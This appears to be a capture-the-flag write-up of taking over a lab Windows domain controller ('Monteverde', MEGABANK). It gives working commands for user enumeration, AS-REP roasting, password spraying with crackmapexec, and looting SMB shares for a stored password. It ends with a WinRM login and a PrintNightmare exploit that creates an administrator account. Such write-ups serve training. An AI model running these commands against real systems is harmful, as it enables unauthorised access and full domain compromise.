# Monteverde - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Domain Information
Using enum4linux, I gathered information about the domain:
```
Domain Name: MEGABANK
Domain SID: S-1-5-21-391775091-850290835-3566037492
```

### User Enumeration
The enum4linux output revealed several domain users:
```
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

I also noted interesting group memberships:
```
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan
Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
```

The Azure Admins group was particularly interesting as a potential privilege escalation path.

## Gaining Initial Access

### Password Spraying
I created a list of usernames from the enum4linux output:
```bash
echo "Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan" > users.txt
```

First, I attempted to identify users vulnerable to AS-REP Roasting, but this was unsuccessful:
```bash
GetNPUsers.py megabank.local/ -usersfile users.txt -no-pass -dc-ip 10.129.228.111
```

I then tried a password spraying attack, using each username as a potential password:
```bash
crackmapexec smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce
```

This revealed valid credentials:
- **Username**: SABatchJobs
- **Password**: SABatchJobs

### SMB Enumeration
With the discovered credentials, I connected to the SMB service:
```bash
smbclient.py megabank.local/SABatchJobs:SABatchJobs@10.129.228.111
```

I discovered several shares and explored them:
```bash
smbclient //10.129.228.111/users$ -U megabank.local/SABatchJobs
```

Using the `tree` command to recursively list directories, I found an interesting file:
```
\users\mhope\azure.xml
```

I downloaded and examined this file:
```bash
get mhope/azure.xml
cat azure.xml
```

This file contained credentials for the user mhope:
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <S N="Password">4n0therD4y@n0th3r</S>
    </Props>
  </Obj>
</Objs>
```

## Lateral Movement

### Accessing mhope Account
Using the discovered password, I attempted to authenticate as mhope:
```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r'
```

This provided access as the mhope user, who was a member of the Azure Admins group.

## Privilege Escalation

### Exploiting PrintNightmare
After researching privilege escalation vectors for Azure Admins, I identified that the target was vulnerable to PrintNightmare (CVE-2021-1675).

I uploaded the PrintNightmare exploit to the target:
```bash
upload CVE-2021-1675.ps1
```

Then executed the exploit to create a new administrative user:
```powershell
Import-Module ./CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Dolphin1"
```

### Gaining Administrative Access
With the newly created administrative user, I established a new WinRM session:
```bash
evil-winrm -i 10.129.228.111 -u hacker -p 'Dolphin1'
```

This provided me with administrative access to the domain controller, successfully completing the challenge.

A quick check confirmed my administrative privileges:
```powershell
whoami /all
```

The output showed that my new user was a member of the local Administrators group.